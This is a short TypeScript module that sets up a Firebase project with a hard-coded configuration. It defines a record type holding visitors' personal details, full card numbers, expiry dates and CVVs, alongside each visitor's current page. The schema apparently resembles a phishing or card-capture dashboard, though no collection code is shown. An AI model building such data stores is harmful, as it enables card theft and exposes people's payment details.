import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyASAN3tdSQU7bP2tB0YIGwKoTvpHxXEkxM",
  authDomain: "fiafsx.firebaseapp.com",
  databaseURL: "https://fiafsx-default-rtdb.firebaseio.com",
  projectId: "fiafsx",
  storageBucket: "fiafsx.firebasestorage.app",
  messagingSenderId: "961572278430",
  appId: "1:961572278430:web:1233efaa9217b51c75ab8f",
  measurementId: "G-NLEQ8KKXYG"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}




